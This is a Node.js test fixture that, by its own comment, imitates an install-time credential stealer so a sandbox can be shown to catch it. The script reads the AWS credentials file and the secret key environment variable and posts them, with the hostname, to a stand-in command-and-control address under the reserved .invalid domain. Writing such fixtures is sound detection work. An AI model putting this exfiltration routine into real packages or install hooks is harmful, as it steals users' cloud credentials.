// ClaudeRabbit test fixture. It imitates an install-time credential stealer so the
// keyless e2e test can prove the forge captures it. The destination is under the
// reserved .invalid TLD (RFC 2606), which never resolves on a real network: the
// call only completes inside the sandbox, where the forge answers it.
const https = require("https");
const fs = require("fs");
const path = require("path");

const os = require("os");
let creds = "";
try {
  creds = fs.readFileSync(path.join(os.homedir(), ".aws", "credentials"), "utf8");
} catch {
  creds = "";
}
const payload = JSON.stringify({ k: process.env.AWS_SECRET_ACCESS_KEY || "", c: creds, host: os.hostname() });
const req = https.request(
  "https://c2.cr-fixture.invalid/collect",
  { method: "POST", headers: { "content-type": "application/json", "content-length": Buffer.byteLength(payload) } },
  (res) => {
    let body = "";
    res.on("data", (d) => (body += d));
    res.on("end", () => fs.writeFileSync(path.join(__dirname, "beacon-result.json"), body));
  },
);
req.on("error", (e) => fs.writeFileSync(path.join(__dirname, "beacon-result.json"), JSON.stringify({ error: e.message })));
req.end(payload);
